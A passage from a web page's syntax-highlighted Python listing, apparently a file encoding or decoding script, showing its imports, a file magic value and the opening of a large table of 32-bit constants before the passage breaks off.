class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">block_size = <span class="number">4</span></span><br><span class="line">file_magic = <span class="string">b&quot;\xFF\xFF\xDB\xEE&quot;</span></span><br><span class="line"></span><br><span class="line">enc_tbl = [</span><br><span class="line">    <span class="number">0xc6bfb437</span>, <span class="number">0x8601dd6b</span>, <span class="number">0x9f6bdbea</span>, <span class="number">0xe3ec6fea</span>, <span class="number">0x9f6283a8</span>, <span class="number">0xd21da726</span>, <span class="number">0xc15ff083</span>, <span class="number">0x3dec6868</span>, <span class="number">0x53f4c551</span>, <span class="number">0x8cddfaeb</span>, <span class="number">0xf3c858de</span>, <span class="number">0xa5a3995d</span>, <span class="number">0x8ced646b</span>, <span class="number">0xde783524</span>, <span class="number">0x5f83b518</span>, <span class="number">0x20b1a8dc</span>, <span class="number">0x0095b96a</span>, <span class="number">0x1a7d641c</span>, <span class="number">0xf0b529e1</span>, <span class="number">0x17abf4ef</span>,</span><br><span class="line">    <span class="number">0x4ba44454</span>, <span class="number">0x24477765</span>, <span class="number">0x4f477d43</span>, <span class="number">0x13163da6</span>, <span class="number">0x1cfdc4b9</span>, <span class="number">0xc98feb0c</span>, <span class="number">0x1263e38c</span>, <span class="number">0x9214113b</span>, <span class="number">0x5530b57b</span>, <span class="number">0x97c9c907</span>, <span class="number">0x59c62012</span>, <span class="number">0x8ef987d2</span>, <span class="number">0xe9bc51c2</span>, <span class="number">0xde70b2f2</span>, <span class="number">0x3118de7a</span>, <span class="number">0x66dda446</span>, <span class="number">0xbabd9012</span>, <span class="number">0x881f794f</span>, <span class="number">0x52741f20</span>, <span class="number">0xdfc43ad9</span>,</span><br><span class="line">    <span class="number">0x16aff5ff</span>, <span class="number">0x4c133c12</span>, <span class="number">0x8594ac3e</span>, <span class="number">0xbf95602c</span>, <span class="number">0xd00badc9</span>, <span class="number">0x608c398d</span>, <span class="number">0x46ff9161</span>, <span class="number">0x3f00ecbd</span>, <span class="number">0xed3c0bdf</span>, <span class="number">0x77e37cc9</span>, <span class="number">0xe3c35119</span>, <span class="number">0x66d486fc</span>, <span class="number">0x3ee1a90d</span>, <span class="number">0x7ee04048</span>, <span class="number">0xbe254e4e</span>, <span class="number">0x9b7c0584</span>, <span class="number">0xe8b5d0f1</span>, <span class="number">0x168f6f7d</span>, <span class="number">0x8fa08863</span>, <span class="number">0xf734d73e</span>,</span><br><span class="line">    <span class="number">0x58e56b08</span>, <span class="number">0x6f179538</span>, <span class="number">0x47e0c609</span>, <span class="number">0x522e3e48</span>, <span class="number">0xb71b908f</span>, <span class="number">0x1db04b1a</span>, <span class="number">0x0dfb2e29</span>, <span class="number">0x9df3f71e</span>, <span class="number">0x73072a55</span>, <span class="number">0xe9d6d17c</span>, <span class="number">0xef17f00a</span>, <span class="number">0x4ff4a7ed</span>, <span class="number">0x6f11d3dd</span>, <span class="number">0xe57d4240</span>, <span class="number">0x730bdaf2</span>, <span class="number">0xbeb18cb2</span>, <span class="number">0x23f2a7b9</span>, <span class="number">0x88edc6e6</span>, <span class="number">0x7219fb97</span>, <span class="number">0x41152194</span>,</span><br><span class="line">    <span class="number">0x76cc5eb1</span>, <span class="number">0x22c7de91</span>, <span class="number">0x4186e4b3</span>, <span class="number">0x87efa1ae</span>, <span class="number">0x173a54e0</span>, <span class="number">0x8e49b7b4</span>, <span class="number">0xa3390d88</span>, <span class="number">0x9499f12e</span>, <span class="number">0x1e2f362a</span>, <span class="number">0xf92bda22</span>, <span class="number">0x133dcd2f</span>, <span class="number">0xb5bf7704</span>, <span class="number">0x133007a4</span>, <span class="number">0x677ea91c</span>, <span class="number">0x7ca51393</span>, <span class="number">0xb271661b</span>, <span class="number">0xb961496b</span>, <span class="number">0x7d37c903</span>, <span class="number">0x8f1baf38</span>, <span class="number">0x69a2ca9f</span>,</span><br><span class="line">    <span class="number">0xdeebcb61</span>, <span class="number">0x596bce09</span>, <span class="number">0x0a610760</span>, <span class="number">0x410896ce</span>, <span class="number">0x803f612a</span>, <span class="number">0xe17166f7</span>, <span class="number">0x6329e37e</span>, <span class="number">0x69676067</span>, <span class="number">0xcd15b586</span>, <span class="number">0x28a8262d</span>, <span class="number">0xe55f85c8</span>, <span class="number">0xe9b68a7e</span>, <span class="number">0xfe84fccf</span>, <span class="number">0xa568180b</span>, <span class="number">0x0a776072</span>, <span class="number">0x1fcc5ea0</span>, <span class="number">0x5237f259</span>, <span class="number">0x655cb945</span>, <span class="number">0x0ed0a769</span>, <span class="number">0x2ddfb75f</span>,</span><br><span class="line">    <span class="number">0x02ab9014</span>, <span class="number">0x60829de3</span>, <span class="number">0xce7d8582</span>, <span class="number">0xc7a0840e</span>, <span class="number">0x2db226de</span>, <span class="number">0x2f4d65b1</span>, <span class="number">0x3562407e</span>, <span class="number">0x6f60bb04</span>, <span class="number">0xd5bf4fac</span>, <span class="number">0x5c1b419a</span>, <span class="number">0x2e2aed20</span>, <span class="number">0x4ba278be</span>, <span class="number">0xe5826e22</span>, <span class="number">0xf1719ad8</span>, <span class="number">0x8355c16a</span>, <span class="number">0x7f9c5099</span>, <span class="number">0xf81d43e8</span>, <span class="number">0x96d68a16</span>, <span class="number">0x51b4fbd6</span>, <span class="number">0xc5aba1a9</span>,</span><br><span class="line">    <span class="number">0x2906faaf</span>, <span class="number">0x08df650b</span>, <span class="number">0x8c2cf238</span>, <span class="number">0x47660236</span>, <span class="number">0x21284442</span>, <span class="number">0x1be465d3</span>, <span class="number">0x7b2f6118</span>, <span class="number">0xdd2c089d</span>, <span class="number">0xc70ab20d</span>, <span class="number">0x2164a83a</span>, <span class="number">0x6e718555</span>, <span class="number">0xc75ddbf1</span>, <span class="number">0x89fd68c1</span>, <span class="number">0xe4b4911e</span>, <span class="number">0x80d2f2b8</span>, <span class="number">0xd7e03857</span>, <span class="number">0xc40fc98c</span>, <span class="number">0x47a30b80</span>, <span class="number">0x94589a48</span>, <span class="number">0x3a55dd73</span>,</span><br><span class="line">    <span class="number">0xf935cd28</span>, <span class="number">0xa9ba2903</span>, <span class="number">0x078f8563</span>, <span class="number">0x3151d61b</span>, <span class="number">0xacde3d3e</span>, <span class="number">0xb8ecd154</span>, <span class="number">0x87c24b49</span>, <span class="number">0xb10a0678</span>, <span class="number">0x35cf9006</span>, <span class="number">0x2ae5a60b</span>, <span class="number">0xd7b0ef0e</span>, <span class="number">0xdab27594</span>, <span class="number">0x5407ef84</span>, <span class="number">0xe12ade07</span>, <span class="number">0xc3bb788b</span>, <span class="number">0x193e6187</span>, <span class="number">0xbe2d59b0</span>, <span class="number">0xf5f845eb</span>, <span class="number">0x52366e4f</span>, <span class="number">0x5135869b</span>,</span><br><span class="line">    <span class="number">0x343869c2</span>, <span class="number">0xec048a46</span>, <span class="number">0x0a0440c8</span>, <span class="number">0xafb3a1cc</span>, <span class="number">0x04db06f7</span>, <span class="number">0x1455dde2</span>, <span class="number">0x8b42b7a5</span>, <span class="number">0x33e04cba</span>, <span class="number">0xb6412b66</span>, <span class="number">0x729ee85c</span>, <span class="number">0xfadf7cde</span>, <span class="number">0xa14fcaf4</span>, <span class="number">0xa7b3121e</span>, <span class="number">0x2b01d813</span>, <span class="number">0x1be0c240</span>, <span class="number">0xc0a73eb8</span>, <span class="number">0xcc90e00f</span>, <span class="number">0x014b45c9</span>, <span class="number">0x86cbc26c</span>, <span class="number">0xb91f7d5e</span>,</span><br><span class="line">    <span class="number">0xb5172fd6</span>, <span class="number">0x9fe38ef7</span>, <span class="number">0x9b7f0bff</span>, <span class="number">0x6ae221c4</span>, <span class="number">0x69846e79</span>, <span class="number">0x8090ea82</span>, <span class="number">0x31e71cb4</span>, <span class="number">0x83e8e898</span>, <span class="number">0xab099975</span>, <span class="number">0x389f7b0c</span>, <span class="number">0xf0235da1</span>, <span class="number">0xa69496fa</span>, <span class="number">0xd19e910f</span>, <span class="number">0x1a44d0de</span>, <span class="number">0x163d1c84</span>, <span class="number">0x071de1bf</span>, <span class="number">0x9f827f9f</span>, <span class="number">0x13dcb3bc</span>, <span class="number">0x32f65cf8</span>, <span class="number">0x09082987</span>,</span><br><span class="line">    <span class="number">0xb6e29776</span>, <span class="number">0xb3d15d21</span>, <span class="number">0x02669d17</span>, <span class="number">0x4bd68fb6</span>, <span class="number">0xbe618152</span>, <span class="number">0x4cdbf269</span>, <span class="number">0x0e5e5c74</span>, <span class="number">0x6b505a5a</span>, <span class="number">0x31cf50fd</span>, <span class="number">0xa9cce485</span>, <span class="number">0x14518715</span>, <span class="number">0xc920e57c</span>, <span class="number">0xca7f0f8b</span>, <span class="number">0x7ab47b24</span>, <span class="number">0x2502b1bd</span>, <span class="number">0xcbe725d7</span>, <span class="number">0x1686ae0b</span>, <span class="number">0x76e8d3cc</span>, <span class="number">0x03e562cd</span>, <span class="number">0x47c27f90</span>,</span><br><span class="line">    <span class="number">0x0bf1ac9f</span>, <span class="number">0x7203e668</span>, <span class="number">0x12660dbe</span>, <span class="number">0xfa1754a0</span>, <span class="number">0x955de065</span>, <span class="number">0x1c5fcd6b</span>, <span class="number">0xeb5a16ac</span>, <span class="number">0x93a8f58a</span>, <span class="number">0x757c8449</span>, <span class="number">0x086943af</span>, <span class="number">0x9e099367</span>, <span class="number">0x04d88f41</span>, <span class="number">0xf14da8c6</span>, <span class="number">0x5b014a71</span>, <span class="number">0x9f08ab6f</span>, <span class="number">0x546e02c5</span>, <span class="number">0xaa839216</span>, <span class="number">0x163623d3</span>, <span class="number">0xb77e2262</span>, <span class="number">0x1ec0d6af</span>,</span><br><span class="line">    <span class="number">0x322e2556</span>, <span class="number">0xd8efe2a8</span>, <span class="number">0xa84791fb</span>, <span class="number">0x6579b782</span>, <span class="number">0x76ec0831</span>, <span class="number">0x563924e4</span>, <span class="number">0x52a367d9</span>, <span class="number">0x8e4f672f</span>, <span class="number">0xe7f0190a</span>, <span class="number">0xca685659</span>, <span class="number">0x5c558d20</span>, <span class="number">0xc6609bf8</span>, <span class="number">0xa2fe64eb</span>, <span class="number">0xcc6c308c</span>, <span class="number">0x3b5f7fb3</span>, <span class="number">0x6f113528</span>, <span class="number">0xd150f04c</span>, <span class="number">0x1db84f0d</span>, <span class="number">0x9f0c40d0</span>, <span class="number">0xff9dda06</span>,</span><br><span class="line">    <span class="number">0x40b986f7</span>, <span class="number">0x652f5c98</span>, <span class="number">0x2d5d424f</span>, <span class="number">0xd508779c</span>, <span class="number">0xce2cefea</span>, <span class="number">0x408c40c1</span>, <span class="number">0xac2add9b</span>, <span class="number">0x401bf9e5</span>, <span class="number">0x4ec635fa</span>, <span class="number">0xbe2039a7</span>, <span class="number">0x2fa7b7c3</span>, <span class="number">0xe8d5e764</span>, <span class="number">0x94685963</span>, <span class="number">0x287d0a85</span>, <span class="number">0xd37e1c7e</span>, <span class="number">0xc50e60ce</span>, <span class="number">0xd936baa0</span>, <span class="number">0x60d2f38b</span>, <span class="number">0x0a631af7</span>, <span class="number">0xe6098986</span>,</span><br><span class="line">    <span class="number">0x736621df</span>, <span class="number">0x5ab72072</span>, <span class="number">0x1b3ccc30</span>, <span class="number">0xece32f2d</span>, <span class="number">0xcb7e8e6a</span>, <span class="number">0x46accdc1</span>, <span class="number">0xb3ee9a55</span>, <span class="number">0x651b7664</span>, <span class="number">0xb8dc21a3</span>, <span class="number">0x59eb5f92</span>, <span class="number">0x0d719c43</span>, <span class="number">0x0177bbbc</span>, <span class="number">0xd8b65e50</span>, <span class="number">0xe49e3639</span>, <span class="number">0x8f43577a</span>, <span class="number">0xbf5fbaa2</span>, <span class="number">0x40529e13</span>, <span class="number">0x9ab9bc17</span>, <span class="number">0xe737dcac</span>, <span class="number">0xd0ffebba</span>,</span><br><span class="line">    <span class="number">0x1bd139b0</span>, <span class="number">0xbfb6b530</span>, <span class="number">0x7f119a22</span>, <span class="number">0x77b6ac03</span>, <span class="number">0x3da04c35</span>, <span class="number">0x3e5a8446</span>, <span class="number">0x4e1c5123</span>, <span class="number">0x14dba10e</span>, <span class="number">0xae8227a4</span>, <span class="number">0x7b7d1c1f</span>, <span class="number">0xd28cb72a</span>, <span class="number">0xfae9dabe</span>, <span class="number">0x8eeaec66</span>, <span class="number">0xadea7dad</span>, <span class="number">0x5ba21551</span>, <span class="number">0x15f1e4bb</span>, <span class="number">0x6cdc9cbc</span>, <span class="number">0xd1b50569</span>, <span class="number">0xa9fda62c</span>, <span class="number">0xb4a69d8e</span>,</span><br><span class="line">    <span class="number">0x8552f7b0</span>, <span class="number">0x0e5ab05d</span>, <span class="number">0x7afda900</span>, <span class="number">0x7160f49a</span>, <span class="number">0x9cd74a63</span>, <span class="number">0x6c8bd299</span>, <span class="number">0xaf11f097</span>, <span class="number">0x69baa295</span>, <span class="number">0xdcd99b1d</span>, <span class="number">0x36467f3a</span>, <span class="number">0xbb8a82a6</span>, <span class="number">0x300ccd43</span>, <span class="number">0x78961a0c</span>, <span class="number">0xef6d7ab8</span>, <span class="number">0x20477213</span>, <span class="number">0x15b36dfb</span>, <span class="number">0x878d11e7</span>, <span class="number">0x7c026830</span>, <span class="number">0x923400a6</span>, <span class="number">0x68f97cfc</span>,</span><br><span class="line">    <span class="number">0xcc8492f8</span>, <span class="number">0x21c02cb1</span>, <span class="number">0xe6190991</span>, <span class="number">0xf0a15763</span>, <span class="number">0xb789f74b</span>, <span class="number">0x7cdef308</span>, <span class="number">0xd8452eef</span>, <span class="number">0x8f700ba2</span>, <span class="number">0x1f34c45e</span>, <span class="number">0xaeb19b7f</span>, <span class="number">0x6e4b1460</span>, <span class="number">0x6a77b90b</span>, <span class="number">0x168067b2</span>, <span class="number">0x739f3d63</span>, <span class="number">0x164a0031</span>, <span class="number">0xe5d9af44</span>, <span class="number">0x9fe6950f</span>, <span class="number">0xb3877e24</span>, <span class="number">0x787893b5</span>, <span class="number">0x52eeebbf</span>,</span><br><span class="line">    <span class="number">0x8119aab3</span>, <span class="number">0x9d71c82e</span>, <span class="number">0xaeddb512</span>, <span class="number">0xb2739605</span>, <span class="number">0x6de257c9</span>, <span class="number">0x2583e4ca</span>, <span class="number">0xae3efb2a</span>, <span class="number">0xcf70e8d8</span>, <span class="number">0x5f3bf373</span>, <span class="number">0x93720ba0</span>, <span class="number">0x3d7356f4</span>, <span class="number">0x074a5bfa</span>, <span class="number">0x86705c32</span>, <span class="number">0xc750b7e7</span>, <span class="number">0x1172dded</span>, <span class="number">0xf3691a33</span>, <span class="number">0x2ead9e77</span>, <span class="number">0x99c6d776</span>, <span class="number">0x971b630d</span>, <span class="number">0x3119628c</span>,</span><br><span class="line">    <span class="number">0x71b7175b</span>, <span class="number">0x3c7fc6b5</span>, <span class="number">0x7176c0bc</span>, <span class="number">0xfdfa123c</span>, <span class="number">0x6869b5e1</span>, <span class="number">0x567d3e0a</span>, <span class="number">0xb63f1c8e</span>, <span class="number">0x86a509fb</span>, <span class="number">0x0350e36a</span>, <span class="number">0xe683b1ba</span>, <span class="number">0xc8573667</span>, <span class="number">0xb5d68412</span>, <span class="number">0x0f0ca321</span>, <span class="number">0x1b2f93c4</span>, <span class="number">0xc366d743</span>, <span class="number">0xa75f5f1f</span>, <span class="number">0x6bd30415</span>, <span class="number">0x578e1228</span>, <span class="number">0x9ad7e1de</span>, <span class="number">0xdd923625</span>,</span><br><span class="line">    <span class="number">0xb5c6960d</span>, <span class="number">0x839e8c6b</span>, <span class="number">0xb79da6a8</span>, <span class="number">0x5d516c96</span>, <span class="number">0x3e031138</span>, <span class="number">0xc26a69b5</span>, <span class="number">0x71e02b2a</span>, <span class="number">0x83d5badf</span>, <span class="number">0x3f10bcda</span>, <span class="number">0x5cd27b7b</span>, <span class="number">0xc1b7327b</span>, <span class="number">0xb2b1fc19</span>, <span class="number">0xb5da9c7c</span>, <span class="number">0x9e6c6788</span>, <span class="number">0x2c48de6c</span>, <span class="number">0x0acbf365</span>, <span class="number">0x901e38fe</span>, <span class="number">0x76301365</span>, <span class="number">0x22ee70e6</span>, <span class="number">0x76b31faf</span>,</span><br><span class="line">    <span class="number">0x86c404b6</span>, <span class="number">0xb233216d</span>, <span class="number">0x3031b902</span>, <span class="number">0x61cce2a6</span>, <span class="number">0xebaa334b</span>, <span class="number">0x7ca20c9c</span>, <span class="number">0x0925a9cf</span>, <span class="number">0xc6ba2e40</span>, <span class="number">0xa39f3b34</span>, <span class="number">0x7da5c1a1</span>, <span class="number">0xa6e137ae</span>, <span class="number">0xdc517135</span>, <span class="number">0x29e9606b</span>, <span class="number">0x7ba0e387</span>, <span class="number">0x30511df0</span>, <span class="number">0xa1c85fc9</span>, <span class="number">0xdf3a9378</span>, <span class="number">0x60cd580c</span>, <span class="number">0x375adb50</span>, <span class="number">0x6ddc4bc0</span>,</span><br><span class="line">    <span class="number">0x2cd369d4</span>, <span class="number">0x8c6af18d</span>, <span class="number">0x65849d8a</span>, <span class="number">0x1badd1c3</span>, <span class="number">0x5318ad5c</span>, <span class="number">0xefcf5a8c</span>, <span class="number">0x353c1838</span>, <span class="number">0xa1ee6742</span>, <span class="number">0xff578c6d</span>, <span class="number">0x6feed6cc</span>, <span class="number">0x916cdd96</span>, <span class="number">0x2207e0d3</span>, <span class="number">0xb509a85c</span>, <span class="number">0xac18ddf6</span>, <span class="number">0xe6035b44</span>, <span class="number">0x58f262b5</span>, <span class="number">0x255ee071</span>, <span class="number">0x7e4fbd36</span>, <span class="number">0x5701bb1c</span>, <span class="number">0x70d05c02</span>,</span><br><span class="line">    <span class="number">0x6b04c60a</span>, <span class="number">0x119ff091</span>, <span class="number">0x7de77c28</span>, <span class="number">0x01ea0beb</span>, <span class="number">0xffa2012e</span>, <span class="number">0xcd289b5f</span>, <span class="number">0x8cb81969</span>, <span class="number">0x38ae5b48</span>, <span class="number">0x2de87535</span>, <span class="number">0x2c5f4e7a</span>, <span class="number">0xdd37d2e0</span>, <span class="number">0x7b321056</span>, <span class="number">0x073afded</span>, <span class="number">0xddba0425</span>, <span class="number">0x103f5785</span>, <span class="number">0x9c7751dd</span>, <span class="number">0x5b2f0227</span>, <span class="number">0x96d6a165</span>, <span class="number">0x8aa4f0c1</span>, <span class="number">0x4a9c9e92</span>,</span><br><span class="line">    <span class="number">0x8a09df65</span>, <span class="number">0x706839b6</span>, <span class="number">0x7e148267</span>, <span class="number">0x07c2b26f</span>, <span class="number">0x50573df4</span>, <span class="number">0x27ec1fe2</span>, <span class="number">0xddbed1b6</span>, <span class="number">0x3025b059</span>, <span class="number">0x5ea770b6</span>, <span class="number">0x6f36fccb</span>, <span class="number">0xfaca270c</span>, <span class="number">0x8aa5738f</span>, <span class="number">0xb43322a9</span>, <span class="number">0xeb081caa</span>, <span class="number">0x4ec2902a</span>, <span class="number">0x25cd3eea</span>, <span class="number">0xf7fbc7c8</span>, <span class="number">0x7df412f0</span>, <span class="number">0x65bbff82</span>, <span class="number">0x3df15d68</span>,</span><br><span class="line">    <span class="number">0xa2952aed</span>, <span class="number">0x385845c4</span>, <span class="number">0xcd00c3b2</span>, <span class="number">0xcb041ee3</span>, <span class="number">0xc067ba13</span>, <span class="number">0xc1a00e99</span>, <span class="number">0x18b3ecfa</span>, <span class="number">0xe05be99e</span>, <span class="number">0x2b5793b7</span>, <span class="number">0xf8c1e25b</span>, <span class="number">0xff4d0214</span>, <span class="number">0x184f1919</span>, <span class="number">0x48c62d8a</span>, <span class="number">0x54696b77</span>, <span class="number">0xeb358643</span>, <span class="number">0x7b26489e</span>, <span class="number">0x74f64703</span>, <span class="number">0x20581ac2</span>, <span class="number">0x86a3a152</span>, <span class="number">0xd91e6385</span>,</span><br><span class="line">    <span class="number">0x0ddf82cf</span>, <span class="number">0x1b2b8787</span>, <span class="number">0x9d656c97</span>, <span class="number">0x2b35f5a4</span>, <span class="number">0x8009457c</span>, <span class="number">0x34b5625b</span>, <span class="number">0x91f6bf53</span>, <span class="number">0x092c2469</span>, <span class="number">0x49bb878c</span>, <span class="number">0x67bddbdd</span>, <span class="number">0x7808a8f4</span>, <span class="number">0x06bab5d8</span>, <span class="number">0xf1052269</span>, <span class="number">0x1c4dc31c</span>, <span class="number">0x41f4cd77</span>, <span class="number">0x7428fdef</span>, <span class="number">0x35ddabda</span>, <span class="number">0xae48e659</span>, <span class="number">0xde331397</span>, <span class="number">0xa75ef097</span>,</span><br><span class="line">    <span class="number">0x8ee510a2</span>, <span class="number">0x3f1a42e3</span>, <span class="number">0x36411ad6</span>, <span class="number">0x5c3bb01d</span>, <span class="number">0xb64090a1</span>, <span class="number">0x89e36f7b</span>, <span class="number">0x623708aa</span>, <span class="number">0xfdf4ed1c</span>, <span class="number">0xf714506f</span>, <span class="number">0x2a582445</span>, <span class="number">0x2fcf3401</span>, <span class="number">0x5d6ab83f</span>, <span class="number">0xa685d2af</span>, <span class="number">0xd59b0022</span>, <span class="number">0x158f52da</span>, <span class="number">0x8795a624</span>, <span class="number">0x0f069f3d</span>, <span class="number">0x01ea335b</span>, <span class="number">0x9fa22d71</span>, <span class="number">0x486a4e95</span>,</span><br><span class="line">    <span class="number">0x256ca29a</span>, <span class="number">0x84e10604</span>, <span class="number">0x3c60c902</span>, <span class="number">0xc6b2092c</span>, <span class="number">0xb684090e</span>, <span class="number">0x4989b96a</span>, <span class="number">0x96bce509</span>, <span class="number">0xfaa0f229</span>, <span class="number">0x3220aae8</span>, <span class="number">0x5cb9ced1</span>, <span class="number">0x75e864b0</span>, <span class="number">0xdd116efd</span>, <span class="number">0xa608ec2d</span>, <span class="number">0xf51d3e1c</span>, <span class="number">0xfc548a6e</span>, <span class="number">0x08175bd2</span>, <span class="number">0x044729d5</span>, <span class="number">0x4d1bed73</span>, <span class="number">0xd8b9c5e3</span>, <span class="number">0x52ae7c1b</span>,</span><br><span class="line">    <span class="number">0x946622c5</span>, <span class="number">0x512bb583</span>, <span class="number">0xd3c1d5f5</span>, <span class="number">0x412c4de0</span>, <span class="number">0xdb6a7e5e</span>, <span class="number">0xfbe6fee0</span>, <span class="number">0x59fcd7c7</span>, <span class="number">0x59132cc9</span>, <span class="number">0xf38ea2df</span>, <span class="number">0xf114c426</span>, <span class="number">0x8e686f80</span>, <span class="number">0x1b8c0c33</span>, <span class="number">0x2e954e26</span>, <span class="number">0xfeac08ad</span>, <span class="number">0x70c35e70</span>, <span class="number">0x52442023</span>, <span class="number">0xed58707c</span>, <span class="number">0x7839e1b8</span>, <span class="number">0xf7944491</span>, <span class="number">0xbdbf75dc</span>,</span><br><span class="line">    <span class="number">0x6b68cb1b</span>, <span class="number">0xde45390b</span>, <span class="number">0x9b4b98ed</span>, <span class="number">0x10f33556</span>, <span class="number">0xdb7ec13f</span>, <span class="number">0xbd359844</span>, <span class="number">0x35c36bdb</span>, <span class="number">0x1e6a6a68</span>, <span class="number">0xeedc3b19</span>, <span class="number">0xc0ce9ebd</span>, <span class="number">0xda077d0c</span>, <span class="number">0x97513627</span>, <span class="number">0xbe2ab4a8</span>, <span class="number">0x82416ff9</span>, <span class="number">0x0cd5bd78</span>, <span class="number">0xad41b27f</span>, <span class="number">0xa3b4c5e8</span>, <span class="number">0x4dd1e832</span>, <span class="number">0x53c6bdbe</span>, <span class="number">0xcc6ab880</span>,</span><br><span class="line">    <span class="number">0xce947057</span>, <span class="number">0xb8f9161a</span>, <span class="number">0x668eda53</span>, <span class="number">0xa85834eb</span>, <span class="number">0xa6df8924</span>, <span class="number">0x1da9e9ae</span>, <span class="number">0x052a3c9d</span>, <span class="number">0x65aad5f4</span>, <span class="number">0xacdcf2cf</span>, <span class="number">0x98974b21</span>, <span class="number">0xee583d8b</span>, <span class="number">0xd7686039</span>, <span class="number">0x69c32a05</span>, <span class="number">0x807ef23a</span>, <span class="number">0x22d9756b</span>, <span class="number">0x4854feaf</span>, <span class="number">0x720e05e0</span>, <span class="number">0xe6175b72</span>, <span class="number">0x9149f2bd</span>, <span class="number">0xa4482834</span>,</span><br><span class="line">    <span class="number">0xe2fe8618</span>, <span class="number">0x4ca97bdc</span>, <span class="number">0x3a609ceb</span>, <span class="number">0xa2c60972</span>, <span class="number">0x2fc23750</span>, <span class="number">0x5ba701d5</span>, <span class="number">0x4c86d7b7</span>, <span class="number">0x19b87d79</span>, <span class="number">0xc92ca13b</span>, <span class="number">0x334795a8</span>, <span class="number">0x64b38fd4</span>, <span class="number">0x97273086</span>, <span class="number">0x34bdfed6</span>, <span class="number">0x88f62637</span>, <span class="number">0x46914256</span>, <span class="number">0x2f04690b</span>, <span class="number">0xa5a3edaa</span>, <span class="number">0x3185b7ab</span>, <span class="number">0x35790aad</span>, <span class="number">0xda58400d</span>,</span><br><span class="line">    <span class="number">0xd54655e4</span>, <span class="number">0x4a4ac79c</span>, <span class="number">0x139d026e</span>, <span class="number">0xce9b6d44</span>, <span class="number">0x8651fa21</span>, <span class="number">0xb8000ecf</span>, <span class="number">0x87988316</span>, <span class="number">0x1541eec9</span>, <span class="number">0xb5fb5189</span>, <span class="number">0x689af174</span>, <span class="number">0xbd2eeb22</span>, <span class="number">0x72051645</span>, <span class="number">0xaed24488</span>, <span class="number">0xc6794fbb</span>, <span class="number">0x00f2e376</span>, <span class="number">0x54f9e4ec</span>, <span class="number">0xede0cba2</span>, <span class="number">0xea613503</span>, <span class="number">0xcb433dc0</span>, <span class="number">0xc58bda4f</span>,</span><br><span class="line">    <span class="number">0x365b983e</span>, <span class="number">0x1451bc20</span>, <span class="number">0xc2b18a7d</span>, <span class="number">0xc65ed5bd</span>, <span class="number">0x33374784</span>, <span class="number">0xfdf37490</span>, <span class="number">0x07bff8d0</span>, <span class="number">0x5e118f5c</span>, <span class="number">0xfb18b6fb</span>, <span class="number">0xe09af302</span>, <span class="number">0x496b0dc1</span>, <span class="number">0x5235e5d7</span>, <span class="number">0x6ecb2112</span>, <span class="number">0xd0183177</span>, <span class="number">0x783720c3</span>, <span class="number">0xa185067c</span>, <span class="number">0xdc9b4381</span>, <span class="number">0x4ad1cf10</span>, <span class="number">0x433ad32c</span>, <span class="number">0x1aa35a53</span>,</span><br><span class="line">    <span class="number">0xb3460aac</span>, <span class="number">0xd12b6892</span>, <span class="number">0x44349f2d</span>, <span class="number">0x1f3ffb7a</span>, <span class="number">0x2924f758</span>, <span class="number">0x1883702e</span>, <span class="number">0x6df6ca0e</span>, <span class="number">0x4e82e9bd</span>, <span class="number">0x037b0c08</span>, <span class="number">0xb4c0afdd</span>, <span class="number">0x5edf7c3f</span>, <span class="number">0xf70b8df5</span>, <span class="number">0xb494c0a7</span>, <span class="number">0x47319505</span>, <span class="number">0xac6b8125</span>, <span class="number">0x57d78aa9</span>, <span class="number">0x4a1f64fc</span>, <span class="number">0x944be247</span>, <span class="number">0xae158c49</span>, <span class="number">0x10b405ef</span>,</span><br><span class="line">    <span class="number">0x0ca7f623</span>, <span class="number">0x6c00241a</span>, <span class="number">0x1c0bbaa3</span>, <span class="number">0xb846b675</span>, <span class="number">0x1b89d58d</span>, <span class="number">0x77e4d271</span>, <span class="number">0x7c96f2d5</span>, <span class="number">0x13f8280b</span>, <span class="number">0x5cf84d45</span>, <span class="number">0x16b51699</span>, <span class="number">0xacb454c9</span>, <span class="number">0x8b27dbd2</span>, <span class="number">0xd5c82535</span>, <span class="number">0xd51d9d1a</span>, <span class="number">0x54b628d2</span>, <span class="number">0xa132316a</span>, <span class="number">0xa55a3586</span>, <span class="number">0x6f948e0f</span>, <span class="number">0x4df05295</span>, <span class="number">0xbf64f4b9</span>,</span><br><span class="line">    <span class="number">0x58689f93</span>, <span class="number">0x39a85648</span>, <span class="number">0xa3dedaec</span>, <span class="number">0x911158c4</span>, <span class="number">0x3c92bf0d</span>, <span class="number">0x9e348fe6</span>, <span class="number">0xd9cb180d</span>, <span 